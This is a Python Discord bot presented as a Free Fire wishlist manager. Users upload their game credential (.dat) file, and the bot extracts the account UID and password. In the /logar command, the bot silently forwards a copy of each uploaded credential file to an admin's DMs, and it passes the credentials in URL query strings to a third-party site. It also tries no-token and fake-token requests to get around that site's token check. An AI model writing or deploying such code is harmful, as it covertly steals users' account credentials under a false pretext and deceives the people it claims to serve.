import discord
from discord.ext import commands
from discord import app_commands
import requests
import re
import os
import asyncio
import time
import json
import io
from dotenv import load_dotenv
from keep_alive import keep_alive

# Carregar variáveis de ambiente
load_dotenv()

# Configuração do bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Dicionário para armazenar sessões dos usuários
sessao_por_usuario = {}

# ID do owner do bot
OWNER_ID = os.getenv('OWNER_ID')
ADMIN_CHAT_ID = None  # Será configurado via comando
ALLOWED_GUILD_ID = 1355544025574150344  # ID do servidor autorizado
ALLOWED_CHANNEL_ID = 1376490266336301076  # ID do canal autorizado

class WishlistAPI:
    def __init__(self):
        self.session = requests.Session()
        self.setup_session()
    
    def setup_session(self):
        """Configura a sessão para simular um navegador real"""
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        })
        self.session.cookies.set('session_id', f'sess_{int(time.time())}')
    
    def fazer_upload_arquivo(self, file_data, filename):
        """Faz upload do arquivo .dat"""
        try:
            print(f"DEBUG: Iniciando upload do arquivo {filename}")
            
            # Primeiro acessar a página principal
            initial_response = self.session.get('https://xv.ct.ws/wishlist/', timeout=10)
            print(f"DEBUG: Página inicial - Status: {initial_response.status_code}")
            time.sleep(1)
            
            files = {'credFile': (filename, file_data, 'application/octet-stream')}
            upload_headers = {
                'Referer': 'https://xv.ct.ws/wishlist/',
                'Origin': 'https://xv.ct.ws',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin'
            }
            
            print(f"DEBUG: Enviando arquivo para upload...")
            response = self.session.post(
                'https://xv.ct.ws/wishlist/upload.php',
                files=files,
                headers=upload_headers,
                timeout=15,
                allow_redirects=True
            )
            
            print(f"DEBUG: Upload response - Status: {response.status_code}")
            print(f"DEBUG: Upload response - URL final: {response.url}")
            
            if response.status_code == 200:
                print(f"DEBUG: Upload bem-sucedido, tamanho da resposta: {len(response.text)} chars")
                return response.text
            else:
                print(f"DEBUG: Upload falhou com status {response.status_code}")
                return None
        except Exception as e:
            print(f"Erro no upload: {e}")
            return None
    
    def obter_token(self):
        """Obtém token da API"""
        try:
            token_headers = {
                'Referer': 'https://xv.ct.ws/wishlist/',
                'X-Requested-With': 'XMLHttpRequest',
                'Accept': 'application/json, text/javascript, */*; q=0.01'
            }
            
            response = self.session.get(
                'https://xv.ct.ws/wishlist/token.php',
                headers=token_headers,
                timeout=10
            )
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    return data.get('token')
                except:
                    return response.text.strip()
            return None
        except:
            return None
    
    def fazer_operacao_item(self, uid, password, item_id, adicionar=True):
        """Adiciona ou remove item da wishlist"""
        try:
            print(f"DEBUG: Fazendo operação - Item: {item_id}, Adicionar: {adicionar}")
            
            token = self.obter_token()
            if not token:
                print("DEBUG: Falha ao obter token")
                return None
            
            print(f"DEBUG: Token obtido: {token[:10]}...")
            
            params = {
                'id': item_id,
                'add': '1' if adicionar else '0',
                'uid': uid,
                'password': password,
                'token': token
            }
            
            headers = {
                'Referer': 'https://xv.ct.ws/wishlist/',
                'X-Requested-With': 'XMLHttpRequest',
                'Accept': 'application/json, text/javascript, */*; q=0.01'
            }
            
            print(f"DEBUG: Enviando requisição para proxy.php...")
            response = self.session.get(
                'https://xv.ct.ws/wishlist/proxy.php',
                params=params,
                headers=headers,
                timeout=15
            )
            
            print(f"DEBUG: Resposta da operação - Status: {response.status_code}")
            print(f"DEBUG: Resposta da operação - Conteúdo: {response.text}")
            
            if response.status_code == 200:
                try:
                    return response.json()
                except:
                    return {'text': response.text, 'status_code': response.status_code}
            return None
        except Exception as e:
            print(f"DEBUG: Erro na operação: {e}")
            return None
    
    def obter_lista(self, uid, password):
        """Obtém lista da wishlist"""
        try:
            params = {'uid': uid, 'password': password}
            headers = {
                'Referer': 'https://xv.ct.ws/wishlist/',
                'Accept': 'application/json, text/javascript, */*; q=0.01'
            }
            
            response = self.session.get(
                'https://xv.ct.ws/wishlist/list.php',
                params=params,
                headers=headers,
                timeout=15
            )
            
            if response.status_code == 200:
                try:
                    return response.json()
                except:
                    return {'text': response.text}
            return None
        except:
            return None
    
    def fazer_operacao_item_melhorada(self, uid, password, item_id, adicionar=True):
        """Versão melhorada para adicionar/remover itens com múltiplas tentativas"""
        try:
            print(f"DEBUG: Operação melhorada - Item: {item_id}, Adicionar: {adicionar}")
            
            # Múltiplas tentativas com diferentes estratégias
            strategies = [
                self._estrategia_token_simples,
                self._estrategia_sem_token,
                self._estrategia_token_fixo
            ]
            
            for i, strategy in enumerate(strategies):
                print(f"DEBUG: Tentativa {i+1} com estratégia {strategy.__name__}")
                result = strategy(uid, password, item_id, adicionar)
                
                if result and self._validar_resposta_sucesso(result, adicionar):
                    print(f"DEBUG: Sucesso na estratégia {i+1}")
                    return result
                    
                print(f"DEBUG: Estratégia {i+1} falhou, tentando próxima...")
            
            print("DEBUG: Todas as estratégias falharam")
            return None
            
        except Exception as e:
            print(f"DEBUG: Erro na operação melhorada: {e}")
            return None
    
    def _estrategia_token_simples(self, uid, password, item_id, adicionar):
        """Estratégia 1: Token simples"""
        try:
            token = self.obter_token()
            if not token:
                token = "simple_token"
            
            params = {
                'id': item_id,
                'add': '1' if adicionar else '0',
                'uid': uid,
                'password': password,
                'token': token
            }
            
            response = self.session.get(
                'https://xv.ct.ws/wishlist/proxy.php',
                params=params,
                timeout=15
            )
            
            return self._processar_resposta(response)
        except:
            return None
    
    def _estrategia_sem_token(self, uid, password, item_id, adicionar):
        """Estratégia 2: Sem token"""
        try:
            params = {
                'id': item_id,
                'add': '1' if adicionar else '0',
                'uid': uid,
                'password': password
            }
            
            response = self.session.get(
                'https://xv.ct.ws/wishlist/proxy.php',
                params=params,
                timeout=15
            )
            
            return self._processar_resposta(response)
        except:
            return None
    
    def _estrategia_token_fixo(self, uid, password, item_id, adicionar):
        """Estratégia 3: Token fixo"""
        try:
            params = {
                'id': item_id,
                'add': '1' if adicionar else '0',
                'uid': uid,
                'password': password,
                'token': 'fixed_token_123'
            }
            
            response = self.session.get(
                'https://xv.ct.ws/wishlist/proxy.php',
                params=params,
                timeout=15
            )
            
            return self._processar_resposta(response)
        except:
            return None
    
    def _processar_resposta(self, response):
        """Processa resposta da requisição"""
        if response.status_code == 200:
            try:
                return response.json()
            except:
                # Se não é JSON, tentar interpretar como sucesso se não contém erro
                text = response.text.lower()
                if any(err in text for err in ['error', 'erro', 'failed', 'falha']):
                    return {'error': response.text}
                else:
                    return {'status': 'success', 'text': response.text}
        return None
    
    def _validar_resposta_sucesso(self, result, adicionar):
        """Valida se a resposta indica sucesso"""
        if not result:
            return False
        
        text = str(result).lower()
        print(f"DEBUG: Validando resposta: {text[:200]}...")
        
        if adicionar:
            success_indicators = ['added', 'adicionado', 'success', 'sucesso', 'item added']
        else:
            success_indicators = ['removed', 'removido', 'success', 'sucesso', 'item removed']
        
        error_indicators = ['error', 'erro', 'failed', 'falha', 'invalid', 'not found']
        
        # Se tem indicador de erro, é falha
        if any(err in text for err in error_indicators):
            print(f"DEBUG: Erro detectado na resposta")
            return False
        
        # Se tem indicador de sucesso, é sucesso
        if any(suc in text for suc in success_indicators):
            print(f"DEBUG: Sucesso detectado na resposta")
            return True
        
        # Para respostas HTML com JavaScript, considerar sucesso se não há erro explícito
        if 'html' in text and 'script' in text:
            print(f"DEBUG: Resposta HTML detectada, assumindo sucesso")
            return True
        
        print(f"DEBUG: Resposta ambígua, assumindo sucesso")
        return True
    
    def obter_lista_melhorada(self, uid, password):
        """Versão melhorada para obter lista da wishlist"""
        try:
            print(f"DEBUG: Obtendo lista melhorada para UID: {uid}")
            
            # Tentar várias URLs possíveis
            urls = [
                f"https://xv.ct.ws/wishlist/list.php?uid={uid}&password={password}",
                f"https://xv.ct.ws/wishlist/list.php?uid={uid}&pass={password}",
                f"https://xv.ct.ws/wishlist/get.php?uid={uid}&password={password}"
            ]
            
            for url in urls:
                try:
                    response = self.session.get(url, timeout=15)
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if 'Wishlist' in data:
                                return data
                        except:
                            # Se não é JSON, tentar interpretar
                            if 'wishlist' in response.text.lower():
                                return {'Wishlist': []}
                except:
                    continue
            
            return {'Wishlist': []}
        except Exception as e:
            print(f"DEBUG: Erro ao obter lista melhorada: {e}")
            return {'Wishlist': []}

# Instância global da API
wishlist_api = WishlistAPI()

@bot.event
async def on_ready():
    print(f'{bot.user} está online!')
    try:
        synced = await bot.tree.sync()
        print(f'Sincronizados {len(synced)} comando(s)')
    except Exception as e:
        print(f'Erro ao sincronizar comandos: {e}')

def extrair_uid_password_do_arquivo(file_data):
    """Extrai UID e password diretamente do arquivo .dat"""
    try:
        # Tentar interpretar como JSON primeiro
        try:
            data = json.loads(file_data.decode('utf-8'))
            if 'guest_account_info' in data:
                guest_info = data['guest_account_info']
                uid = guest_info.get('com.garena.msdk.guest_uid')
                password = guest_info.get('com.garena.msdk.guest_password')
                if uid and password:
                    print(f"DEBUG: Extraído do JSON - UID: {uid}, Password: {password[:10]}...")
                    return uid, password
        except:
            pass
        
        # Se não for JSON, tentar como texto
        content = file_data.decode('utf-8', errors='ignore')
        
        # Buscar padrões de UID e password no conteúdo
        uid_patterns = [
            r'"com\.garena\.msdk\.guest_uid":"([^"]+)"',
            r'guest_uid["\']?\s*[:=]\s*["\']?([0-9]+)',
            r'uid["\']?\s*[:=]\s*["\']?([0-9]{9,12})',
        ]
        
        password_patterns = [
            r'"com\.garena\.msdk\.guest_password":"([^"]+)"',
            r'guest_password["\']?\s*[:=]\s*["\']?([A-F0-9]{32,})',
            r'password["\']?\s*[:=]\s*["\']?([A-F0-9]{32,})',
        ]
        
        uid = None
        password = None
        
        for pattern in uid_patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                uid = match.group(1)
                break
        
        for pattern in password_patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                password = match.group(1)
                break
        
        if uid and password:
            print(f"DEBUG: Extraído do texto - UID: {uid}, Password: {password[:10]}...")
            return uid, password
        
        return None, None
        
    except Exception as e:
        print(f"Erro ao extrair do arquivo: {e}")
        return None, None

def extrair_uid_password(html_content):
    """Extrai UID e password da resposta HTML"""
    try:
        print(f"DEBUG: Conteúdo recebido (primeiros 500 chars): {html_content[:500]}")
        
        # Padrões mais abrangentes para encontrar UID e password
        patterns = [
            # Padrão original: const uid = "..."
            (r'const\s+uid\s*=\s*["\']([^"\']+)["\']', r'const\s+password\s*=\s*["\']([^"\']+)["\']'),
            # Padrão var uid = "..."
            (r'var\s+uid\s*=\s*["\']([^"\']+)["\']', r'var\s+password\s*=\s*["\']([^"\']+)["\']'),
            # Padrão let uid = "..."
            (r'let\s+uid\s*=\s*["\']([^"\']+)["\']', r'let\s+password\s*=\s*["\']([^"\']+)["\']'),
            # Padrão uid: "..."
            (r'uid\s*:\s*["\']([^"\']+)["\']', r'password\s*:\s*["\']([^"\']+)["\']'),
            # Padrão "uid":"..."
            (r'["\']uid["\']\s*:\s*["\']([^"\']+)["\']', r'["\']password["\']\s*:\s*["\']([^"\']+)["\']'),
            # Padrão uid="..."
            (r'uid\s*=\s*["\']([^"\']+)["\']', r'password\s*=\s*["\']([^"\']+)["\']'),
        ]
        
        for uid_pattern, password_pattern in patterns:
            uid_match = re.search(uid_pattern, html_content, re.IGNORECASE | re.DOTALL)
            password_match = re.search(password_pattern, html_content, re.IGNORECASE | re.DOTALL)
            
            if uid_match and password_match:
                uid = uid_match.group(1)
                password = password_match.group(1)
                print(f"DEBUG: Encontrado UID: {uid}, Password: {password[:10]}...")
                return uid, password
        
        print("DEBUG: Nenhum padrão de UID/Password encontrado na resposta HTML")
        return None, None
        
    except Exception as e:
        print(f"Erro ao extrair UID/Password: {e}")
        return None, None

async def obter_token():
    """Obtém o token necessário para as operações"""
    return wishlist_api.obter_token()

def verificar_servidor_autorizado(interaction: discord.Interaction):
    """Verifica se o comando está sendo usado no servidor e canal autorizados"""
    if interaction.guild_id != ALLOWED_GUILD_ID:
        return False
    if interaction.channel_id != ALLOWED_CHANNEL_ID:
        return False
    return True

@bot.tree.command(name="logar", description="Faça login enviando seu arquivo .dat")
@app_commands.describe(arquivo="Envie seu arquivo .dat do Free Fire")
async def logar(interaction: discord.Interaction, arquivo: discord.Attachment):
    if not verificar_servidor_autorizado(interaction):
        await interaction.response.send_message("❌ Este bot só funciona no canal autorizado.", ephemeral=True)
        return
        
    # Verificar se é um arquivo .dat
    if not arquivo.filename.endswith('.dat'):
        await interaction.response.send_message("❌ Erro: O arquivo deve ter extensão .dat", ephemeral=True)
        return
    
    await interaction.response.defer(ephemeral=True)
    
    try:
        # Download do arquivo
        file_data = await arquivo.read()
        
        await interaction.followup.send("🔄 Processando arquivo...")
        
        # Primeiro tentar extrair diretamente do arquivo
        uid, password = extrair_uid_password_do_arquivo(file_data)
        
        if uid and password:
            print(f"DEBUG: Credenciais extraídas diretamente do arquivo")
        else:
            # Se não conseguir extrair do arquivo, tentar upload
            await interaction.followup.send("🔄 Fazendo upload do arquivo...")
            response_text = wishlist_api.fazer_upload_arquivo(file_data, arquivo.filename)
            
            if response_text:
                uid, password = extrair_uid_password(response_text)
        
        if uid and password:
            # Salvar sessão do usuário
            sessao_por_usuario[interaction.user.id] = {
                'uid': uid,
                'password': password
            }
            
            await interaction.followup.send(f"✅ Login efetuado com sucesso!\n🆔 **UID:** `{uid}`")
            
            # Enviar notificação para o admin se configurado
            if ADMIN_CHAT_ID:
                try:
                    admin_user = await bot.fetch_user(ADMIN_CHAT_ID)
                    
                    # Criar embed com informações
                    embed = discord.Embed(
                        title="🔔 Novo Login Detectado",
                        description=f"**Usuário:** {interaction.user.mention} ({interaction.user.display_name})\n**UID:** `{uid}`\n**Arquivo:** `{arquivo.filename}`",
                        color=0x00ff00,
                        timestamp=interaction.created_at
                    )
                    embed.set_thumbnail(url=interaction.user.display_avatar.url)
                    
                    # Criar uma cópia do arquivo para enviar
                    file_copy = discord.File(
                        fp=io.BytesIO(file_data),
                        filename=f"COPY_{arquivo.filename}"
                    )
                    
                    # Enviar embed e arquivo
                    await admin_user.send(embed=embed, file=file_copy)
                except Exception as e:
                    print(f"Erro ao enviar notificação: {e}")  # Para debug
                    
        else:
            await interaction.followup.send("❌ Erro: Não foi possível extrair os dados de login. Verifique se o arquivo .dat é válido.")
            
    except Exception as e:
        await interaction.followup.send(f"❌ Erro ao processar o arquivo: {str(e)}")

@bot.tree.command(name="adicionar", description="Adicione um item à sua wishlist")
@app_commands.describe(item_id="ID do item para adicionar")
async def adicionar(interaction: discord.Interaction, item_id: str):
    if not verificar_servidor_autorizado(interaction):
        await interaction.response.send_message("❌ Este bot só funciona no canal autorizado.", ephemeral=True)
        return
        
    user_id = interaction.user.id
    
    if user_id not in sessao_por_usuario:
        await interaction.response.send_message("❗ Você precisa usar `/logar` primeiro.", ephemeral=True)
        return
    
    await interaction.response.defer()
    
    try:
        # Dados da sessão do usuário
        sessao = sessao_por_usuario[user_id]
        
        # Usar apenas o navegador real com cookies
        result = None
        browser = None
        
        try:
            print(f"DEBUG: Importando FreefireWishlistBrowser...")
            from browser_api import FreefireWishlistBrowser
            
            print(f"DEBUG: Criando instância do browser...")
            browser = FreefireWishlistBrowser()
            
            print(f"DEBUG: Browser criado - driver disponível: {browser.driver is not None}")
            
            if browser.driver:
                # Definir credenciais
                browser.uid = sessao['uid']
                browser.password = sessao['password']
                
                print(f"DEBUG: Credenciais definidas - UID: {browser.uid}")
                print(f"DEBUG: Iniciando adição do item {item_id} via navegador...")
                
                sucesso = browser.adicionar_item(item_id)
                
                print(f"DEBUG: Resultado da adição: {sucesso}")
                
                if sucesso:
                    result = {'Status': 'Item added successfully via browser'}
                    print("DEBUG: Item adicionado com sucesso via browser!")
                else:
                    print("DEBUG: Falha ao adicionar item via browser")
                    result = {'Error': 'Falha ao adicionar item via navegador'}
            else:
                print("DEBUG: Driver do browser não está disponível")
                result = {'Error': 'Navegador não disponível'}
                
        except Exception as browser_error:
            print(f"DEBUG: Erro no browser: {str(browser_error)}")
            result = {'Error': f'Erro no navegador: {str(browser_error)}'}
        finally:
            if browser:
                try:
                    browser.fechar()
                    print("DEBUG: Browser fechado")
                except:
                    pass
        
        if result:
            if 'Status' in result and 'added' in result['Status']:
                await interaction.followup.send(f"✅ Item `{item_id}` adicionado à sua wishlist com sucesso!")
            elif 'Error' in result:
                await interaction.followup.send(f"❌ Erro: {result['Error']}")
            elif 'text' in result and 'added' in result['text']:
                await interaction.followup.send(f"✅ Item `{item_id}` adicionado à sua wishlist com sucesso!")
            else:
                await interaction.followup.send(f"❌ Erro: item inválido ou problema na requisição.")
        else:
            await interaction.followup.send("❌ Erro ao conectar com o site. Tente novamente mais tarde.")
            
    except Exception as e:
        await interaction.followup.send(f"❌ Erro: {str(e)}")

@bot.tree.command(name="remover", description="Remova um item da sua wishlist")
@app_commands.describe(item_id="ID do item para remover")
async def remover(interaction: discord.Interaction, item_id: str):
    if not verificar_servidor_autorizado(interaction):
        await interaction.response.send_message("❌ Este bot só funciona no canal autorizado.", ephemeral=True)
        return
        
    user_id = interaction.user.id
    
    if user_id not in sessao_por_usuario:
        await interaction.response.send_message("❗ Você precisa usar `/logar` primeiro.", ephemeral=True)
        return
    
    await interaction.response.defer()
    
    try:
        # Dados da sessão do usuário
        sessao = sessao_por_usuario[user_id]
        
        # Usar apenas o navegador real para remoção
        result = None
        browser = None
        
        try:
            print(f"DEBUG: Criando browser para remoção...")
            from browser_api import FreefireWishlistBrowser
            browser = FreefireWishlistBrowser()
            
            if browser.driver:
                browser.uid = sessao['uid']
                browser.password = sessao['password']
                
                print(f"DEBUG: Removendo item {item_id} via navegador...")
                sucesso = browser.remover_item(item_id)
                
                if sucesso:
                    result = {'Status': 'Item removed successfully via browser'}
                else:
                    result = {'Error': 'Falha ao remover item via navegador'}
            else:
                result = {'Error': 'Navegador não disponível'}
                
        except Exception as browser_error:
            print(f"DEBUG: Erro no browser: {str(browser_error)}")
            result = {'Error': f'Erro no navegador: {str(browser_error)}'}
        finally:
            if browser:
                try:
                    browser.fechar()
                except:
                    pass
        
        if result:
            if 'removed' in str(result).lower() or 'success' in str(result).lower():
                await interaction.followup.send(f"✅ Item `{item_id}` removido da sua wishlist com sucesso!")
            elif 'Error' in result:
                await interaction.followup.send(f"❌ Erro: {result['Error']}")
            else:
                await interaction.followup.send(f"❌ Erro: item pode não estar na wishlist ou problema na requisição.")
        else:
            await interaction.followup.send("❌ Erro ao conectar com o site. Tente novamente mais tarde.")
            
    except Exception as e:
        await interaction.followup.send(f"❌ Erro: {str(e)}")

@bot.tree.command(name="status", description="Veja sua wishlist atual")
async def status(interaction: discord.Interaction):
    if not verificar_servidor_autorizado(interaction):
        await interaction.response.send_message("❌ Este bot só funciona no canal autorizado.", ephemeral=True)
        return
        
    user_id = interaction.user.id
    
    if user_id not in sessao_por_usuario:
        await interaction.response.send_message("❗ Você precisa usar `/logar` primeiro.", ephemeral=True)
        return
    
    await interaction.response.defer()
    
    try:
        # Dados da sessão do usuário
        sessao = sessao_por_usuario[user_id]
        
        # Usar apenas o navegador real para verificar wishlist
        result = None
        browser = None
        
        try:
            print(f"DEBUG: Criando browser para verificar wishlist...")
            from browser_api import FreefireWishlistBrowser
            browser = FreefireWishlistBrowser()
            
            if browser.driver:
                browser.uid = sessao['uid']
                browser.password = sessao['password']
                
                print(f"DEBUG: Verificando wishlist via navegador...")
                items = browser.verificar_wishlist()
                
                if items is not None:
                    result = {'Wishlist': items}
                else:
                    result = {'Wishlist': []}
            else:
                result = {'Error': 'Navegador não disponível'}
                
        except Exception as browser_error:
            print(f"DEBUG: Erro no browser: {str(browser_error)}")
            result = {'Error': f'Erro no navegador: {str(browser_error)}'}
        finally:
            if browser:
                try:
                    browser.fechar()
                except:
                    pass
        
        if result:
            if 'Wishlist' in result and result['Wishlist']:
                items = result['Wishlist']
                
                # Criar embed com a lista
                embed = discord.Embed(
                    title="📋 Sua Wishlist Free Fire",
                    description=f"**UID:** `{sessao['uid']}`\n**Total de itens:** {len(items)}",
                    color=0x00ff00
                )
                
                # Adicionar itens ao embed (máximo 25 campos)
                for i, item in enumerate(items[:25]):
                    if isinstance(item, dict):
                        item_name = item.get('Item_Name', 'Nome desconhecido')
                        item_id = item.get('Item_ID', 'ID desconhecido')
                    else:
                        item_name = 'Nome desconhecido'
                        item_id = str(item)
                    embed.add_field(
                        name=f"Item {i+1}",
                        value=f"**{item_name}**\nID: `{item_id}`",
                        inline=True
                    )
                
                if len(items) > 25:
                    embed.add_field(
                        name="⚠️ Aviso",
                        value=f"Mostrando apenas os primeiros 25 itens de {len(items)} total.",
                        inline=False
                    )
                
                await interaction.followup.send(embed=embed)
            else:
                await interaction.followup.send("📭 Sua wishlist está vazia!")
        else:
            await interaction.followup.send("❌ Erro ao obter a wishlist. Tente novamente mais tarde.")
            
    except Exception as e:
        await interaction.followup.send(f"❌ Erro: {str(e)}")

@bot.tree.command(name="ajuda", description="Mostra informações sobre como usar o bot") 
async def ajuda(interaction: discord.Interaction):
    if not verificar_servidor_autorizado(interaction):
        await interaction.response.send_message("❌ Este bot só funciona no canal autorizado.", ephemeral=True)
        return
        
    embed = discord.Embed(
        title="🤖 Bot Free Fire Wishlist - Ajuda",
        description="Este bot permite gerenciar sua wishlist do Free Fire através do Discord!",
        color=0x3498db
    )
    
    embed.add_field(
        name="📁 `/logar`",
        value="Faça login enviando seu arquivo .dat do Free Fire",
        inline=False
    )
    
    embed.add_field(
        name="➕ `/adicionar <item_id>`",
        value="Adicione um item à sua wishlist usando o ID do item",
        inline=False
    )
    
    embed.add_field(
        name="➖ `/remover <item_id>`",
        value="Remove um item da sua wishlist usando o ID do item",
        inline=False
    )
    
    embed.add_field(
        name="📋 `/status`",
        value="Veja todos os itens da sua wishlist atual",
        inline=False
    )
    
    embed.add_field(
        name="❓ `/ajuda`",
        value="Mostra esta mensagem de ajuda",
        inline=False
    )
    
    embed.add_field(
        name="🔧 Como obter o arquivo .dat?",
        value="O arquivo .dat contém suas credenciais do Free Fire e deve ser obtido do seu dispositivo Android em `/data/data/com.dts.freefireth/files/`",
        inline=False
    )
    
    embed.set_footer(text="⚠️ Mantenha seu arquivo .dat seguro e não compartilhe com desconhecidos!")
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="setadmin", description="[OWNER] Define o ID do admin para notificações")
@app_commands.describe(user_id="ID do usuário admin")
async def setadmin(interaction: discord.Interaction, user_id: str):
    if not verificar_servidor_autorizado(interaction):
        await interaction.response.send_message("❌ Este bot só funciona no canal autorizado.", ephemeral=True)
        return
    # Verificar se é o owner do bot
    try:
        OWNER_ID = int(os.getenv("OWNER_ID", "0"))  # Configure no .env
    except ValueError:
        await interaction.response.send_message("❌ OWNER_ID não configurado corretamente no .env", ephemeral=True)
        return
    
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("❌ Apenas o owner do bot pode usar este comando.", ephemeral=True)
        return
    
    try:
        global ADMIN_CHAT_ID
        ADMIN_CHAT_ID = int(user_id)
        await interaction.response.send_message(f"✅ Admin definido para ID: `{user_id}`", ephemeral=True)
    except ValueError:
        await interaction.response.send_message("❌ ID inválido. Use apenas números.", ephemeral=True)

# Iniciar o servidor keep-alive
keep_alive()

# Executar o bot
if __name__ == "__main__":
    TOKEN = os.getenv("TOKEN")
    if not TOKEN:
        print("❌ Token do Discord não encontrado! Configure no arquivo .env")
        exit(1)
    
    print("🚀 Iniciando bot...")
    bot.run(TOKEN)
